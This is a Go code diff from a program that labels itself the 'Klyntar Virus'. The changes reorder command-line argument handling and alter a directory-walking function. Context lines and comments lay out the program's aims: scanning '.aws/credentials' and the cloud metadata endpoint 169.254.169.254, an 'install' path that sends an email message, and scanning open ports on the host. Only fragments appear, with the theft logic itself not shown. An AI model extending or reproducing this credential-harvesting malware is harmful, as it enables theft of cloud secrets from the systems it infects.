@@ -11,16 +11,6 @@ import (
 
 func main() {
 
-	// fmt.Println(os.Args)
-	if len(os.Args) < 2 || os.Args[1] == "help" {
-		help()
-		return
-	}
-
-	if os.Args[1] == "klyntar" {
-		fmt.Println(Bold(Cyan("Starting Klyntar Virus...\n")))
-	}
-
 	//Scan .aws/credentials or 169.254.169.254/metadata using http request
 
 	if len(os.Args) > 1 && os.Args[1] == "install" {
@@ -37,6 +27,17 @@ func main() {
 		sendEmail(emailMessage)
 	} else {
 		showDirectorys()
+		return
+	}
+
+	// fmt.Println(os.Args)
+	if os.Args[1] == "help" {
+		help()
+		return
+	}
+
+	if os.Args[1] == "klyntar" {
+		fmt.Println(Bold(Cyan("Starting Klyntar Virus...\n")))
 	}
 
 	//Scan all ports open in host
@@ -56,13 +57,13 @@ func help() {
 
 func showDirectorys() {
 
-	root, errWd := os.Getwd()
+	// root, errWd := os.Getwd()
 
-	if errWd != nil {
-		panic(errWd)
-	}
+	// if errWd != nil {
+	// 	panic(errWd)
+	// }
 
-	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
+	err := filepath.Walk("./", func(path string, info os.FileInfo, err error) error {
 		splitedDir := strings.Split(path, "/")
 		onlyDir := splitedDir[len(splitedDir)-1]
 
